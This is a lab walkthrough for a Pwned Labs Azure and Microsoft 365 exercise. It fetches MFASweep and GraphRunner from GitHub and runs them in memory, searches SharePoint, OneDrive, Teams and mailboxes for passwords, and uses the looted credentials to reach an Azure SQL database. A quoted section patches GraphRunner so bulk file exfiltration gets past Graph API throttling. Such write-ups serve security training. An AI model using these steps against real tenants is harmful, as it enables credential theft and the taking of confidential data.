https://pwnedlabs.io/labs/loot-exchange-teams-sharepoint-with-graphrunner

Login with provided creds:

```bash
az login --use-device-code
az account show --query id --output tsv

pwsh

PS:> Connect-MgGraph -UseDeviceAuthentication
PS:> Connect-AzAccount -UseDeviceAuthentication
```

Enumerate the Entra ID:

```PowerShell
$CurrentSubscriptionID = "XXXXX-XXX-XXX-XXX-XXXXXXXXXXXX"
# Set output format
$OutputFormat = "table"
# Set the given subscription as the active one
& az account set --subscription $CurrentSubscriptionID
# List resources in the current subscription
& az resource list -o $OutputFormat
```

We find multiple SQL Database servers.

Check if MFA is enforced:

```PowerShell
IEX (iwr 'https://raw.githubusercontent.com/dafthack/MFASweep/master/MFASweep.ps1')

Invoke-MFASweep -Username first.last@megabigtech.com -Password <password> -Recon -IncludeADFS
######### SINGLE FACTOR ACCESS RESULTS #########                                                                        
Microsoft Graph API                    | YES
Azure Resource Manager API             | YES
M365 w/ Windows UA                     | NO
M365 w/ Linux UA                       | NO
M365 w/ MacOS UA                       | NO
M365 w/ Android UA                     | NO
M365 w/ iPhone UA                      | NO
M365 w/ Windows Phone UA               | NO
M365 w/ Unknown Platform UA            | NO
Exchange Web Services (BASIC Auth)     | NO
Active Sync (BASIC Auth)               | NO
ADFS                                   | NO
```

Microsoft 365 applications rely on the Microsoft Graph API, and this could allow us to enumerate and exfiltrate user generated content! Check if our user hase a MS365 license:

```PowerShell
Get-MgUserLicenseDetail -UserId "first.last@megabigtech.com"

Connect-MgGraph -UseDeviceAuthentication -Scopes "User.Read.All", "Directory.Read.All"     # May need to reconnect with this to enumerate license information
```

A useful tool for finding loot in MS365 is `GraphRunner` post-exploitation toolset:

```PowerShell
IEX (iwr 'https://raw.githubusercontent.com/dafthack/GraphRunner/main/GraphRunner.ps1')

List-GraphRunnerModules
Get-GraphTokens
```

We successfully get tokens and they are automatically written to the `$tokens` variable.

Continue using `GraphRunner` modules with `$token` variable set and search SharePoint and OneDrive for `password`:

```PowerShell
Get-Help Invoke-SearchSharePointAndOneDrive -examples
Invoke-SearchSharePointAndOneDrive -Tokens $tokens -SearchTerm 'password'
	Finance Logins.docx
	passwords.xlsx
```

We find two file with creds in them. Now search SharePoint and OneDrive for `bonus`:

```PowerShell
Invoke-SearchSharePointAndOneDrive -Tokens $tokens -SearchTerm 'bonus'
	Bonuses - Confidential.xlsx
```

We find one but it is password protected. Now search Teams for `password`:

```PowerShell
Invoke-SearchTeams -Tokens $tokens -SearchTerm password
```

We find a password from Teams that works for the `Bonuses - Confidential.xlsx` document. Now, search Mailbox for `password`:

```PowerShell
Invoke-SearchMailbox -Tokens $tokens -SearchTerm "password" -MessageCount 40
```

We find one email revealing the subdomain `mbt-finance.database.win` (truncated `*.windows.net`) and it's credentials.This is an [Azure SQL database](https://learn.microsoft.com/en-us/azure/azure-sql/database/sql-database-paas-overview?view=azuresql). Azure SQL databases are based on the latest stable version of the Microsoft SQL Server database engine.

We can interact with the database using PowerShell (*NOTE*: `mbt-finance.database.win` would need to be connected by calling it `mbt-finance.database.windows.net`):

```PowerShell
# Connect
$conn = New-Object System.Data.SqlClient.SqlConnection
$password='<password>'
$conn.ConnectionString = "Server=mbt-finance.database.windows.net;Database=Finance;User ID=<username>;Password=$password;"
$conn.Open()

# List Tables
$sqlcmd = $conn.CreateCommand()
$sqlcmd.Connection = $conn
$query = "SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE';"
$sqlcmd.CommandText = $query
$adp = New-Object System.Data.SqlClient.SqlDataAdapter $sqlcmd
$data = New-Object System.Data.DataSet
$adp.Fill($data) | Out-Null
$data.Tables

# Enumerate the Table
$sqlcmd = $conn.CreateCommand()
$sqlcmd.Connection = $conn
$query = "SELECT * FROM <TABLE>;"
$sqlcmd.CommandText = $query
$adp = New-Object System.Data.SqlClient.SqlDataAdapter $sqlcmd
$data = New-Object System.Data.DataSet
$adp.Fill($data) | Out-Null
$data.Tables | ft

# Close connection
$conn.Close()
```

The flag is in the table.

---

"When exfiltrating files from OneDrive or SharePoint using GraphRunner, we often hit Microsoft Graph API rate limits. The API returns HTTP 429 (Too Many Requests) responses once your request volume exceeds the tenant or application threshold. If left unhandled, this causes downloads to fail mid-operation and can result in incomplete data collection.Further information on this can be found in [Microsoft's documentation](https://learn.microsoft.com/en-us/graph/throttling). The tool's author, dafthack, has also acknowledged that this can sometimes be an [issue](https://github.com/dafthack/GraphRunner/issues/9). If you encounter this issue when running the command below, you can follow the procedure below to update GraphRunner with throttle-aware retry logic (this is recommended even if the command below is working, as you are likely to encounter this issue in the future).

Microsoft recommends two strategies for dealing with throttling. First, honor the `Retry-After` header when it is present in the 429 response. Second, fall back to exponential backoff with jitter when the header is missing. We can implement both by adding a retry wrapper function to GraphRunner and modifying the file download logic.

Open your local copy of GraphRunner and add the following function above `Invoke-DriveFileDownload`. This function wraps any Graph API call with throttle-aware retry logic. It checks for 429 responses, reads the `Retry-After` header if available, and calculates an exponential backoff delay with randomized jitter as a fallback.

```PowerShell
function Invoke-GraphRequestWithBackoff {
    param(
        [Parameter(Mandatory = $true)][string]$Uri,
        [Parameter(Mandatory = $false)][hashtable]$Headers,
        [Parameter(Mandatory = $false)][string]$Method = "GET",
        [Parameter(Mandatory = $false)][string]$OutFile,
        [Parameter(Mandatory = $false)][int]$MaxRetries = 8,
        [Parameter(Mandatory = $false)][int]$BaseDelaySeconds = 2,
        [Parameter(Mandatory = $false)][int]$MaxDelaySeconds = 60
    )

    $attempt = 0

    while ($true) {
        try {
            if ($OutFile) {
                Invoke-RestMethod -Method $Method -Uri $Uri -Headers $Headers -OutFile $OutFile
                return
            }
            else {
                return Invoke-RestMethod -Method $Method -Uri $Uri -Headers $Headers
            }
        }
        catch {
            $attempt++

            $statusCode = $null
            $retryAfter = $null
            $response = $null

            try {
                $response = $_.Exception.Response
            }
            catch {}

            if ($response) {
                try {
                    $statusCode = [int]$response.StatusCode
                }
                catch {}

                try {
                    $retryHeader = $response.Headers["Retry-After"]
                    if ($retryHeader) {
                        if ($retryHeader -is [System.Array]) {
                            $retryAfter = [int]$retryHeader[0]
                        }
                        else {
                            $retryAfter = [int]$retryHeader
                        }
                    }
                }
                catch {}
            }

            if ($statusCode -ne 429) {
                throw
            }

            if ($attempt -gt $MaxRetries) {
                Write-Host -ForegroundColor Red "[!] Max retries reached for request: $Uri"
                throw
            }

            if (-not $retryAfter) {
                $retryAfter = [Math]::Min(
                    $MaxDelaySeconds,
                    ([Math]::Pow(2, $attempt) * $BaseDelaySeconds) + (Get-Random -Minimum 0 -Maximum 3)
                )
            }

            Write-Host -ForegroundColor Yellow "[*] Request throttled (429). Sleeping for $retryAfter second(s) before retry $attempt/$MaxRetries..."
            Start-Sleep -Seconds $retryAfter
        }
    }
}
```

Let's break down what this does. On each failed request, the function inspects the HTTP response. If the status code is anything other than 429, it re-throws the original exception so legitimate errors are not silently swallowed. If it is a 429, the function first checks for a `Retry-After` header. When present, this header tells you exactly how many seconds to wait before retrying. When absent, the function calculates its own delay using the formula `2^attempt * BaseDelaySeconds`, capped at `MaxDelaySeconds`, with a random 0 to 3 second jitter added to prevent synchronized retry storms.

The `MaxRetries` parameter defaults to 8, which provides a generous window. In practice, most throttled requests succeed within the first two or three retries.

Next, locate the `Invoke-DriveFileDownload` function. Find the section where the file content is downloaded using `Invoke-RestMethod` with the `-OutFile` parameter. Replace that call with the retry-aware wrapper, and add a small pacing delay before each download to reduce burstiness.

```PowerShell
Write-Host -ForegroundColor Yellow "[*] Now downloading $FileName"

# Small pacing delay before each download request to reduce burstiness
Start-Sleep -Seconds 3

Invoke-GraphRequestWithBackoff `
    -Uri $downloadUrl `
    -Headers $downloadheaders `
    -OutFile $filename `
    -MaxRetries 6 `
    -BaseDelaySeconds 3 `
    -MaxDelaySeconds 60
```

The 3-second pacing delay before each request is intentional. Without it, GraphRunner fires download requests as fast as the network allows, which quickly triggers throttling on most tenants. By spacing requests apart, you stay under the rate limit for longer and reduce the total number of retries needed.

💡 Note that `MaxRetries` is set to 6 and `BaseDelaySeconds` is set to 3 for the download path specifically. These are more conservative values than the wrapper's defaults. File downloads are heavier operations that tend to trigger stricter throttling, so a longer initial backoff and fewer total retries help avoid hitting the ceiling repeatedly.

After saving your changes, re-import the modified GraphRunner module into your PowerShell session.

```PowerShell
Import-Module .\GraphRunner.ps1 -Force
```